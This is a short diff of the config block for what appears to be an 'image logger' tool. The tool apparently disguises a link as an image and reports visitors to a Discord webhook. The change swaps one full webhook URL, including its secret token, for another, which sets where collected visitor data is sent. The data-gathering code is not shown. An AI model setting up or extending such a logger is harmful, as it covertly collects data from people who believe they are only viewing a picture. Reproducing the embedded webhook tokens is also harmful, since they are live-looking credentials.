@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1416853154686832792/b8_q88umWo6bqAVUFjj2lmZ0iDo2j5NIL9j0iJ9ol2SrFjQDBqnU06Q1_8Ox8Gk9JstF",
+    "webhook": "https://discord.com/api/webhooks/1432147306920022116/wXi1Spfk40UMhuIs6XgDs7sOyZybk5PftODb99SVmi64keMwmDnhu59fMi7KNgeEXd5S",
     "image": "https://image.stern.de/7675942/t/H0/v6/w1440/r1.3333/-/hamburg.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
